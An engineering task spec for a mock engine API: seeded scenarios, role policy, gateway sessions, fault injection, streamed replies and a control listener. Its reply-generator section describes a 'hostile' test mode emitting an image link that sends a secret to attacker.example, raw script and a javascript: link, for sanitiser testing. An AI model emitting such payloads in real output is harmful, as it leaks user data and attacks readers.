# M-04. Mock engine API: seeded data, scenarios, roles, fault injection, streaming

- **Lane:** Mock engine · **Module:** `apps/mock-engine`, `packages/engine-api` (two modules, see Context) · **Milestone:** M2
- **Depends on:** C-04, M-02
- **Status:** done (#27)
- **Spec:** Security hardening (1, 5, 7, 8); Engine security baseline; Enterprise-ready engine architecture; What our platform can and cannot do; ADRs: [0004](../../adr/0004-mock-engine-and-conformance.md), [0005](../../adr/0005-modular-architecture.md), [0006](../../adr/0006-organizations-and-roles.md)

## Goal

The mock engine serves the full engine API contract from `@ptbk/engine-api` (C-04) on its in-tunnel HTTP server, with believable, deterministic data for an organisation with several members and roles, a simulated gateway session, per-endpoint authorisation, streamed chat replies and switchable faults.

## Context

engine-ui (U-*) is built against this server, and the conformance suite (C-05) is first proven against it, so its behaviour is the executable spec for the real engine. It must have no shortcuts the real engine would not have (ADR 0004). The architecture is multi-user from day one: every row carries an org ID, members have roles, and nothing assumes a single owner.

**One fake engine, not two** (decided 2026-10-20, Seb). `@ptbk/engine-api` already contains a complete in-memory engine (C-04, C-07): state, a handler for every route, strict input validation, permission checks, cursor paging, soft delete, revision conflicts, secrets without values, the audit hash chain, events filtered by permission, capability gating, book diagnostics and streamed replies. The mock engine serves that engine over HTTP and adds only what a separate process needs: realistic seed data, sessions and a gateway stand-in, the role policy, faults, the dev login and the control listener. engine-ui's unit tests and the mock engine therefore run the same behaviour, and a gap found here is fixed once, in `engine-api`. **Two modules:** the core changes in Part 1 land first as their own `feat(engine-api)` PR; the status line takes the last PR.

## Scope

### Part 1: `packages/engine-api`

Keep the change minimal. `createInMemoryEngineApiClient`, `createInMemoryEngine` and the shared client suite keep working unchanged.

- **Per-request actor.** `createInMemoryEngineCore(options)` replaces `createInMemoryEngineParts` and `createInMemoryEngineApiTransport`. It returns `{ transport(actor): EngineApiTransport, controller }` over one shared state, with `Actor = { memberId, sessionId, client, permissions: ReadonlySet<Permission>, stepUpFresh: boolean }`. Handlers, audit entries (actor and client) and the event filter use the request's actor instead of the member fixed at creation; a session is `current` when its ID equals `actor.sessionId`. The existing client and engine become thin wrappers with a fixed actor.
- **One session list.** `state.sessions` is the only list of sessions. The mock's gateway creates and ends sessions through controller levers, so revoking a session (including revoke-others) or removing a member through the API ends it for the gateway too.
- **Authorizer port** ([ADR 0006](../../adr/0006-organizations-and-roles.md)): an `authorizer` option with `can(actor, permission, resource): { kind: 'allow' } | { kind: 'deny'; reason }`, where `resource` is `{ kind, id, createdBy? }` resolved from the route's path parameters. The default allows exactly the actor's permission set (today's behaviour). Denials keep C-04's responses and audit outcome; an ID the actor may not know stays 404 where C-04 says so. Ownership applies to routes that act on one resource; lists and events stay filtered by permission only.
- **Bounded event buffer:** an `eventBufferSize` option (default 1,000). The oldest events drop; a `Last-Event-ID` that is unknown or no longer buffered resumes from the oldest buffered event (today an unknown ID replays everything). Event IDs keep increasing across drops and gaps are not signalled, so the UI refetches what it shows on every reconnect; say so in the events route description.
- **Replies:** the `ReplyScript` input gains `chatId` and `messageIndex`, and `ScriptedReply` an optional `delayMs` per chunk, waited through an injected `sleep(ms, signal)`. A paced reply advances whether or not anyone reads it; a disconnect ends only that stream and `Last-Event-ID` resumes it; only the cancel route stops generation.
- **Controller levers** for what the process does on its own: `updateEngine(patch)` (M-06 sets `dashboardUrl`), `updateSecurity(patch)` (relay status per relay from M-01's link states), `addMember(member)` (synthetic members for permission-set sessions), `addSession(session)` and `removeSession(sessionId)` (the gateway's sign-in and sign-out), and a read-only `inspect()` (counts and members for `/__mock/state`, `/__mock/members` and M-06's heartbeat). Levers write no audit entries; only requests are audited. M-07 adds its own levers when it needs them.
- **Subpath exports.** `@ptbk/engine-api/in-memory`: the in-memory engine and `createDemoSeed`. `@ptbk/engine-api/http`: the HTTP binding promoted from `src/testing/in-process-handler.ts`, framework-agnostic and a reference for the real engine: `serveEngineApiRoute(transport, route, params, request): Promise<Response>` (query and body parsing, problem responses, SSE) and `createEngineApiHttpHandler(transport)` built on it with route matching. Out of `src/testing/`, it counts towards coverage and gets its own tests. The main entry keeps only the contract. engine-ui's imports move to the subpath; U-01's marker check stays.

### Part 2: `apps/mock-engine`

- `src/domain/state/seed.ts`: `seedEngine({ seed, scenario, epoch }, deps): InMemorySeed` using `@faker-js/faker` 10.x (`new Faker`, `faker.seed(seed)`, `setDefaultRefDate(epoch)`). Seed IDs come from a seeded `Random`, never `crypto.randomUUID`; IDs created at runtime come from the core's deterministic counters. Same seed, scenario and epoch give byte-identical state.
- `src/domain/state/scenarios.ts`: `empty` (owner only, no agents), `small-team` (owner, admin, two members, one viewer; about 8 agents with chat history, a few secrets; the owner has at least two passkeys, so `last-passkey` is testable), `large-fleet` (about 500 agents, about 40 members across all roles, long chat histories for pagination). Roles are C-04's `Role`.
- `src/domain/authorization/policy.ts`, deny by default: one `permissionsFor(member, session)` that maps roles to permissions (engine policy; C-04 only guarantees that `owner` holds every permission) or returns the session's explicit set (`/__mock/sessions`); the gateway uses it to build `Actor.permissions`. The mock's `Authorizer` adds only ownership (a member changes only agents they created). Code checks permissions, never role names. `secrets.read` allows listing secret metadata, `secrets.manage` writing.
- `src/domain/gateway/sessions.ts`: the gateway's session rules over the core's `state.sessions` (through the levers): 128-bit IDs from `Random`, idle and absolute timeouts from `Clock`, new ID on sign-in, step-up freshness timestamp. A session the core no longer lists is invalid.
- `src/domain/chat/reply-generator.ts`: a `ReplyScript` for the core, deterministic per seed, chat and message index (from the script's input), paced token by token (word and punctuation tokens, default 30 per second with seeded jitter). Produces believable markdown: paragraphs, lists, tables, fenced code blocks (TypeScript, bash, JSON) and links. A `hostile` mode (an agent seeded in `small-team` called e.g. "Injection demo") adds an external image `![x](https://attacker.example/?d=secret)`, raw `<script>`, a `javascript:` link and an over-long line, so engine-ui sanitising is testable (Security hardening 5).
- `src/domain/faults/fault-plan.ts`: strict zod `FaultPlan` { `latencyMs: { min, max }`, `errorRate` (0–1), `errorStatus` (500 | 502 | 503), `dropStreamRate` (cut SSE or WebSocket mid-stream), `slowTunnelBytesPerS`, optional `routes` glob filter }.
- `src/adapters/http/gateway-middleware.ts`: a stand-in for the engine gateway, not a port of it. It resolves the session to the core's `Actor` (member, session, client, effective permissions from the policy, step-up freshness), reading the member's current role from the core on each request; a removed member gets 401. Anonymous API requests get 401 problem+json; anonymous document requests get the sign-in page at C-04's `SIGN_IN_PATH`; `SIGN_OUT_PATH` revokes the session. State-changing requests require same-origin `Origin` and `Sec-Fetch-Site` of `same-origin` or `none`, else 403 before anything else runs. Cookie `__Host-ptbk_session`, `Secure`, `HttpOnly`, `SameSite=Strict`, `Path=/`.
- `src/adapters/http/dev-login.ts`: the mock sign-in page (open-engine style, no inline script or style) lists seeded members by display name and role; choosing one POSTs a form and creates a session for that member. Enabled only when `MOCK_DEV_LOGIN=enabled`. A matching dev step-up form at C-04's `STEP_UP_PATH` marks the session freshly asserted for 5 minutes. There is no WebAuthn in the mock (see Out of scope).
- `src/adapters/http/api-routes.ts`: loops over `ENGINE_API_ROUTE_LIST`, declares each route through `defineRoute` with the table's method, path, permission and schemas, and hands it to `serveEngineApiRoute` with `core.transport(actor)`; behind the gateway and fault middleware, with `Cache-Control: no-store`. No path, method or handler is written by hand, and the mock holds no entity state of its own. M-04 passes `capabilities: []`; M-07 enables them. `GET /engine` reports name, hostname and mode from config and the engine identity; `dashboardUrl` stays `null` until M-06 sets it through the controller.
- `src/adapters/http/fault-middleware.ts` and a tunnel-level throttle on M-01 duplexes for `slowTunnelBytesPerS`.
- `src/adapters/control-server.ts`: `/__mock/*` on a separate plain-HTTP listener at `MOCK_CONTROL_HOST:MOCK_CONTROL_PORT` (default `127.0.0.1:4480`), started only with `MOCK_CONTROL=enabled`, never mounted on the in-tunnel server. Routes: `GET /__mock/state` (summary counts), `POST /__mock/reset` `{ scenario, seed }` (a new core from a new seed; `dashboardUrl`, relay status and the last heartbeat are re-applied), `PUT /__mock/faults` (a `FaultPlan`), `DELETE /__mock/faults`, `GET /__mock/members` (IDs and roles, for tests), `POST /__mock/sessions { subject: { kind: 'owner' } | { kind: 'member', role } | { kind: 'member', permissions: Permission[] } }`. Sessions returns `{ memberId, cookie: { name, value } }` for a session created through the same session store as sign-in; each `permissions` subject creates a new synthetic member (so C-05's cross-member checks get two different members) whose effective permissions are exactly that set (and `GET /me` reports it). Tests add the cookie to the browser context for the engine hostname; e2e UI flows (X-04) and conformance (C-05) sign in this way. All bodies strict zod.
- Config: `MOCK_SEED` (default 1), `MOCK_SCENARIO` (default `small-team`), `MOCK_SEED_EPOCH` (default `2026-10-01T00:00:00Z`), `MOCK_FAULTS` (JSON `FaultPlan`), `MOCK_DEV_LOGIN`, `MOCK_CONTROL`, `MOCK_CONTROL_HOST`, `MOCK_CONTROL_PORT`. Startup fails if `NODE_ENV=production` and `MOCK_CONTROL` or `MOCK_DEV_LOGIN` is enabled.

## Out of scope

- WebAuthn. The mock does not implement the gateway's passkey sign-in, passkey registration or step-up ceremonies; sessions come from `/__mock/sessions` or the dev login. The real gateway, including WebAuthn, is the engine team's (decided 2026-10-19). UI loader and security headers, including `ENGINE_UI_CSP` (M-05). Heartbeat values (M-06 reads counts from the core through a port).

## Design notes

- Every route goes through the app's typed `defineRoute` helper: the engine API routes in a loop over C-04's route table, the mock's own routes (sign-in, sign-out, step-up, `/__mock/*`) by hand. The route-table test covers both ([engineering.md](../../engineering.md#request-handling-every-http-endpoint)). If the helper does not exist yet in this app, create it first in this task.
- A behaviour the mock needs and the core lacks is added to the core with a test, never reimplemented in the mock.
- Faker runs only at seed time; request handling uses the seeded `Random` and the core's counters, so runs stay reproducible.
- HTTP APIs in this repo use Hono ([ADR 0008](../../adr/0008-hono-for-http-apis.md)), but only in adapters: `@ptbk/engine-api` stays framework-agnostic, so the real engine may bind the same table to Hono or Fastify. Nothing under `src/domain/` imports Hono.

## Acceptance criteria

- [x] Core: the shared client suite passes unchanged. New tests: two actors on one core get their own permissions, audit entries and filtered events; a custom `Authorizer` denial gives C-04's 403 and an audited `denied`; the event buffer stays bounded and an expired `Last-Event-ID` resumes from the oldest buffered event; a paced reply keeps advancing without a reader and stops only on cancel; revoking a session or removing a member through the API removes it from `state.sessions`; the main entry exports no in-memory symbol. Coverage stays at or above 90% lines and branches.
- [x] Seed snapshot test: `small-team`, seed 42, fixed epoch produces a stable hash; a different seed changes it; `large-fleet` seeds in under 2 s.
- [x] Contract test: every C-04 operation, including `GET /engine`, `GET /events` and chat cancel, answers through the mock's HTTP server, and every response in the test run validates against C-04's response schema.
- [x] Authorisation matrix test: for each role and each operation, the result matches the policy table; a session with an explicit permission set is allowed exactly the routes whose permission is in the set; `secrets.read` lists secret metadata but cannot write; a member gets 403 problem+json changing another member's agent; a viewer gets 403 on every mutation; a revoked session gets 401 on the next request.
- [x] Secrets are write-only: a test scans every response body in the run for the secret values written during it (canaries).
- [x] Gateway tests: cross-site POST gets 403; missing cookie gets 401; idle timeout expires a session with the fake clock; a session revoked through the API and a removed member's session each get 401 on the next request; audit entries name the session's member.
- [x] Streaming test: a chat reply arrives as SSE tokens, contains a code block, and is identical for the same seed; a disconnect ends only that stream and `Last-Event-ID` resumes it; the cancel route stops generation.
- [x] Events test: an agent rename emits `agent.changed`; a member without `agents.read` does not receive it; reconnecting with `Last-Event-ID` replays missed events.
- [x] `POST /__mock/sessions` test: owner, role and permission-set subjects each yield a working cookie whose `GET /me` matches; an unknown field is 400.
- [x] Fault tests: latency within bounds, error rate within tolerance over 1,000 seeded requests, dropped stream mid-SSE, runtime change through `/__mock/faults` takes effect on the next request.
- [x] Through the tunnel, `/__mock/*` (including `/__mock/sessions`) returns 404 even with `MOCK_CONTROL=enabled`.
- [x] `bun run check` passes.
- [x] **Status** line above set to `done (#<PR>)`.

## Risks and open points

- Passkey ceremonies and real step-up are tested only against the real engine gateway (E-03); engine-ui's passkey screens are exercised here against seeded metadata. X-04 only checks that an anonymous visitor gets nothing but the sign-in page.
- The role-to-permission mapping in `policy.ts` is the mock's guess at engine policy; align it with the engine team before E-01 (C-04 fixes only the owner's full set).
- The core validates every seed record with zod. If `large-fleet` misses its time budget, profile first; a fix belongs in the core.
